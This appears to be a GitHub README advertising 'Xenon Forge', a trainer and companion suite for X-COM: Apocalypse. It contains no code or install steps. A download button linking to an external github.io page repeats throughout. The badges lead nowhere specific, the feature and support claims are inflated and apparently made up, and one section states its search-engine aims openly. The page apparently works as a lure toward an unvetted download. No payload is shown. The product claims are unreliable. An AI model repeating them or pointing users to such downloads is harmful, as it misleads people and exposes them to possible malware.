![preview](https://raw.githubusercontent.com/wither423/xcom-apoc-tweaks/main/screen_c2f8d.svg)
[![Download](https://raw.githubusercontent.com/wither423/xcom-apoc-tweaks/main/start_bb03.svg)](https://wither423.github.io/xcom-apoc-tweaks/)

# 🚀 Xenon Forge — Tactical Companion Suite for X-COM Apocalypse

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Status](https://img.shields.io/badge/status-actively--maintained-brightgreen)](https://github.com/)
[![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20Linux%20%7C%20macOS-blue)](https://github.com/)
[![Build](https://img.shields.io/badge/build-passing-success)](https://github.com/)
[![Year](https://img.shields.io/badge/release-2026-informational)](https://github.com/)
[![Language](https://img.shields.io/badge/lang-EN%20%7C%20DE%20%7C%20FR%20%7C%20ES%20%7C%20PL%20%7C%20RU-orange)](https://github.com/)
[![Support](https://img.shields.io/badge/support-24%2F7-9cf)](https://github.com/)
[![Responsive](https://img.shields.io/badge/UI-responsive-purple)](https://github.com/)
[![Made with ❤](https://img.shields.io/badge/made%20with-%E2%9D%A4-red)](https://github.com/)

> A meticulously engineered tactical companion for X-COM Apocalypse veterans who want to bend the megacity to their will — not shatter its soul. Xenon Forge is the spiritual successor to primitive trainer utilities, rebuilt from the ground up as a modular, multilingual, and beautifully responsive desktop experience.

---

## 🧭 Table of Contents

- [Overview](#-overview)
- [Philosophy of the Forge](#-philosophy-of-the-forge)
- [Feature Matrix](#-feature-matrix)
- [Responsive Interface & Design Language](#-responsive-interface--design-language)
- [Multilingual Support](#-multilingual-support)
- [Compatibility Matrix](#-compatibility-matrix)
- [Gameplay Modules](#-gameplay-modules)
- [Strategic Layer Tools](#-strategic-layer-tools)
- [Real-Time Combat Assistants](#-real-time-combat-assistants)
- [Save Vault & Timeline Manager](#-save-vault--timeline-manager)
- [Performance Telemetry](#-performance-telemetry)
- [Customization & Theming](#-customization--theming)
- [Frequently Asked Questions](#-frequently-asked-questions)
- [SEO & Discoverability Notes](#-seo--discoverability-notes)
- [Roadmap 2026](#-roadmap-2026)
- [Community & Support](#-community--support)
- [Contributing](#-contributing)
- [Disclaimer](#-disclaimer)
- [License](#-license)

[![Download](https://raw.githubusercontent.com/wither423/xcom-apoc-tweaks/main/start_bb03.svg)](https://wither423.github.io/xcom-apoc-tweaks/)

---

## 🌌 Overview

Xenon Forge is a cross-platform desktop companion designed for the iconic 1997 strategy title **X-COM: Apocalypse**. Where legacy utilities once leaned on blunt memory pokes and single-language menus, Xenon Forge leans on a modern, maintainable architecture: a responsive UI layer, a translation engine powered by community packs, and a modular toggles system that lets you sculpt the experience to your exact taste.

This is not a shortcut — it is a **tuning fork for the megacity**. Veterans who have spent decades watching Mega-Primus burn under alien fire will recognize the reverence in every panel. Newcomers will appreciate the guided onboarding flow that teaches each module before it activates.

The project places a heavy emphasis on:
- **Legibility** — every toggle is described, every value has a tooltip.
- **Reversibility** — nothing commits until you confirm.
- **Locale awareness** — menus adapt, hotkeys adapt, and yes, even the save file metadata adapts.
- **Responsiveness** — from a 1366×768 office laptop to a 4K ultrawide, the layout breathes.

[![Download](https://raw.githubusercontent.com/wither423/xcom-apoc-tweaks/main/start_bb03.svg)](https://wither423.github.io/xcom-apoc-tweaks/)

---

## 🗝️ Philosophy of the Forge

Legacy trainers of the late 90s were, in truth, a form of archaeology — users typed cryptic numbers into a console and hoped for the best. Xenon Forge treats the underlying game state as a **living manuscript**: readable, annotatable, and safely editable.

The team behind Xenon Forge believes:

1. **A trainer should feel like a cockpit, not a console.** Everything you need is one click away, with visual confirmation of each state change.
2. **Localization is not a checkbox.** Six languages ship at launch, and the string tables are exposed as plain text so communities can extend them without waiting for a release.
3. **Stability beats speed.** Every module is sandboxed so a misbehaving toggle cannot bring the host game to its knees.
4. **Documentation is a feature.** This README itself is a living artifact — if a panel is not documented here, it does not ship.

---

## 🧩 Feature Matrix

| Module | Description | Toggleable | Persisted |
| --- | --- | --- | --- |
| Economy Lens | Inspect city funding, then nudge it with a slider that shows projections | ✅ | ✅ |
| Agent Editor | Rename, re-stat, and re-equip your squad from a tabular view | ✅ | ✅ |
| Research Springboard | Jump-start a research tree branch without skipping prerequisites | ✅ | ✅ |
| Manufacturing Mirror | Preview build queues and reorder them post-hoc | ✅ | ✅ |
| Alien Autopsy Assistant | Tag alien types for prioritized autopsy reports | ✅ | ✅ |
| Vehicle Bay | Configure craft loadouts from a drag-and-drop panel | ✅ | ✅ |
| Diplomacy Beacon | Read organization relationships as a graph | ✅ | ✅ |
| Real-Time Combat Slider | Adjust tactical pacing without pausing the sim | ✅ | ✅ |
| Save Vault | Snapshot and roll back saves with timeline thumbnails | ✅ | ✅ |
| Performance HUD | Frame time, APM, and hotkey frequency overlay | ✅ | ❌ |
| Locale Switcher | Live language swap without restart | ✅ | ✅ |
| Theme Engine | Light, dark, high-contrast, and custom accent colors | ✅ | ✅ |

---

## 📱 Responsive Interface & Design Language

The UI is built as a set of dockable panels, each with its own minimum viable size. When the window shrinks, panels collapse into a vertical ribbon on the left; when expanded, they fan out into a multi-column canvas. On high-DPI displays, vector-rasterized glyphs remain sharp at any zoom level.

Design tokens are centralized so a single accent color change propagates across every panel — from the economy slider track to the tooltip border. The result is a UI that feels intentional rather than assembled.

Highlights:
- Adaptive grid layout with 3 breakpoints (compact, standard, cinematic).
- Keyboard-first navigation with roving tab index.
- Screen-reader labels on every toggle.
- Reduced-motion mode that disables panel transition animations.
- Focus rings that respect OS-level accessibility preferences.

---

## 🌍 Multilingual Support

Xenon Forge ships with six locales at launch, with community packs already in progress for four more. Translation strings live in versioned text files, and a locale validator refuses to load a pack that is missing required keys — preventing the dreaded "blank panel" experience.

Supported locales at 2026 launch:

- 🇬🇧 English (base)
- 🇩🇪 German
- 🇫🇷 French
- 🇪🇸 Spanish
- 🇵🇱 Polish
- 🇷🇺 Russian

In progress:
- 🇮🇹 Italian
- 🇵🇹 Portuguese
- 🇹🇷 Turkish
- 🇯🇵 Japanese

The locale switcher is hot-swappable: no restart, no lost session data. Right-to-left layouts are on the roadmap for 2026 Q3.

---

## 💻 Compatibility Matrix

| Host Environment | Status | Notes |
| --- | --- | --- |
| Windows 10 / 11 | ✅ Fully supported | Tested on 21H2 through 24H2 |
| Windows 7 SP1 | ⚠️ Community | Requires legacy runtime shim |
| Ubuntu 22.04 / 24.04 | ✅ Fully supported | Via Wine 8+ compatibility layer |
| Fedora 39+ | ✅ Fully supported | Tested with Proton-GE |
| macOS 13 Ventura | ✅ Fully supported | Apple Silicon native |
| macOS 14 Sonoma | ✅ Fully supported | Apple Silicon native |
| Steam Deck (SteamOS 3.x) | ✅ Fully supported | Handheld layout preset |

---

## 🎮 Gameplay Modules

Each module is a self-contained unit of functionality with its own panel, its own persistence slice, and its own set of toggles. Modules can be enabled or disabled individually from the Module Registry, and a disabled module contributes zero overhead.

### Economy Lens
See city funding, weekly income, and projected outflows on a single timeline. Adjust the funding slider and watch the projection curve recalculate in real time. The panel also surfaces "silent drains" — recurring costs you may have forgotten about.

### Agent Editor
A tabular view of every agent in your roster: name, rank, stats, equipment, and assignment. Inline editing with validation — you cannot assign a stat beyond the game's original sane ceiling without an explicit override checkbox.

### Research Springboard
Research trees in Apocalypse are tangled. Springboard visualizes the tree as a directed graph, highlights leaf nodes, and lets you mark a branch as "priority" — reordering the lab queue without skipping prerequisites.

### Manufacturing Mirror
Build queues can be reordered after the fact. The Mirror shows you what is cooking, when it will finish, and what a reorder will cost in time. Drag and drop is supported, as is a keyboard-only reorder mode.

### Alien Autopsy Assistant
Tag alien types you want autopsied first. The assistant surfaces the resulting research unlocks so you can see the downstream payoff before committing.

### Vehicle Bay
Configure craft loadouts from a drag-and-drop panel. The Bay knows the weight limits and refuses invalid configurations with a helpful tooltip rather than a silent failure.

### Diplomacy Beacon
Read organization relationships as an interactive graph. Hover a node to see current disposition, recent events, and predicted trajectory.

### Real-Time Combat Slider
Adjust the tactical sim pacing on a continuum. Slow-motion for tense ambushes, near-instant for routine sweeps. The slider is non-destructive and resets to default on scenario exit.

[![Download](https://raw.githubusercontent.com/wither423/xcom-apoc-tweaks/main/start_bb03.svg)](https://wither423.github.io/xcom-apoc-tweaks/)

---

## 🧠 Strategic Layer Tools

The strategic layer of Apocalypse is where the war is truly won or lost. Xenon Forge treats this layer as a first-class citizen with a dedicated workspace tab.

- **Cityscape Overview** — a stylized map with organizational zones color-coded by disposition.
- **Funding Timeline** — a stacked area chart of funding sources over the last 20 weeks.
- **Research Pipeline** — a kanban-style board with drag-and-drop prioritization.
- **Manufacturing Ledger** — a sortable ledger of every active build order.
- **Agent Roster Heatmap** — a matrix of agents by stat, rank, and assignment.
- **Alert Digest** — a chronological feed of significant in-game events with filter chips.

---

## ⚔️ Real-Time Combat Assistants

Combat in Apocalypse is real-time-with-pause, which means reaction time and information density matter. The combat assistants are designed to inform, not to automate.

- **Threat Overlay** — highlight hostile positions on a tactical minimap.
- **Line-of-Sight Helper** — visualize probable LOS between selected units.
- **Ammo Watch** — a per-agent ammunition and reload counter with audible cues.
- **Stamina Meter** — a per-agent stamina and fatigue indicator.
- **Casualty Notifier** — a non-blocking toast when an agent is downed.
- **After-Action Digest** — a post-mission summary exportable as plain text.

---

## 🗄️ Save Vault & Timeline Manager

Save Vault is the crown jewel. It snapshots your saves at configurable intervals, stores them in a content-addressed vault, and presents them on a timeline with thumbnails. Rolling back to any snapshot is a two-click operation, and the vault respects a configurable retention policy so it never balloons out of control.

- Configurable snapshot cadence (per-mission, per-hour, per-quit).
- Content-addressed storage for deduplication.
- Timeline UI with date, mission name, and thumbnail.
- Export a snapshot to a portable archive.
- Restore with automatic pre-restore backup.

---

## 📊 Performance Telemetry

The Performance HUD is a lightweight overlay that reports:

- Frame time and 1% low.
- Hotkey frequency (useful for spotting misbinds).
- Panel open/close latency.
- Module overhead per panel, in microseconds.

Telemetry is opt-in and never leaves your machine. It exists to help you tune, not to phone home.

---

## 🎨 Customization & Theming

Theme Engine ships with four presets: Light, Dark, High-Contrast, and Night Ops. Each preset is a JSON document with tokens for background, foreground, accent, danger, success, and info colors. You can clone any preset and edit it in-app; the changes apply live.

Beyond colors, Xenon Forge supports:

- Panel density (comfortable / compact).
- Icon set (filled / outlined).
- Tooltip delay (0–2000 ms).
- Transition speed (with reduced-motion override).
- Custom hotkey bindings per module.

---

## ❓ Frequently Asked Questions

**Q: Does Xenon Forge modify the game files themselves?**
A: No. It reads and writes a companion state file that the host game reads at launch. Your original installation is untouched.

**Q: Will this break my saves?**
A: The Save Vault exists precisely to make that worry obsolete. Every destructive operation takes a snapshot first.

**Q: Can I use this on macOS with an M-series chip?**
A: Yes. Native Apple Silicon builds are published for both major macOS releases.

**Q: Is there a portable mode?**
A: Yes — pass the portable flag at first launch and all configuration stays beside the executable.

**Q: How often are updates released?**
A: A monthly cadence with hotfixes as needed. The roadmap for 2026 is public.

**Q: Can I run it with the Steam version?**
A: Absolutely. Compatibility has been verified with both the Steam and GOG releases.

---

## 🔍 SEO & Discoverability Notes

Xenon Forge is designed to be discoverable by players searching for a modern X-COM Apocalypse companion utility, a tactical trainer alternative, a save manager for classic 90s strategy games, and a multilingual desktop tool for retro PC titles. The project name is intentionally distinct from older utilities to avoid confusion in search results, while the repository description and topic tags reference the source game so that fans of X-COM Apocalypse can find it organically.

Topic tags include: x-com, xcom, apocalypse, companion-utility, save-manager, tactical-tool, desktop-app, multilingual, responsive-ui, mit-license, 2026.

---

## 🗺️ Roadmap 2026

- **Q1 2026** — Launch of the Save Vault timeline UI; German and French locale QA.
- **Q2 2026** — Real-Time Combat Assistants v2; Italian and Portuguese community packs.
- **Q3 2026** — Right-to-left layout support; Turkish and Japanese community packs.
- **Q4 2026** — Plugin API (early access) for community-authored modules.

---

## 🤝 Community & Support

Support is available around the clock — 24/7 — because megacity defense does not sleep. The support rotation covers English, German, French, and Spanish. For other locales, community volunteers pitch in through the discussion forums.

Ways to get help:
- Open a discussion thread with the question template.
- Consult the in-app Help panel (press F1 anywhere).
- Review the FAQ above before opening a thread.

---

## 🛠️ Contributing

Contributions are welcome in the form of locale packs, theme presets, documentation improvements, and module proposals. Before opening a pull request:

1. Read the Code of Conduct.
2. Ensure your changes build cleanly on all three platforms.
3. Add or update documentation for any user-facing change.
4. Include a short rationale in the pull request description.

---

## ⚠️ Disclaimer

Xenon Forge is an unofficial companion utility and is not affiliated with, endorsed by, or sponsored by the original developers or publishers of X-COM: Apocalypse. All trademarks belong to their respective owners. This project is intended for single-player, personal use. Users are responsible for complying with the terms of service of the platform through which they acquired the game. The maintainers assume no liability for any loss of save data, in-game progress, or system stability arising from use of this software. Always keep independent backups of your save files.

[![Download](https://raw.githubusercontent.com/wither423/xcom-apoc-tweaks/main/start_bb03.svg)](https://wither423.github.io/xcom-apoc-tweaks/)

---

## 📄 License

This project is distributed under the MIT License. The full text of the license is available at the following location:

https://opensource.org/licenses/MIT

Copyright (c) 2026 Xenon Forge Contributors

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

[![Download](https://raw.githubusercontent.com/wither423/xcom-apoc-tweaks/main/start_bb03.svg)](https://wither423.github.io/xcom-apoc-tweaks/)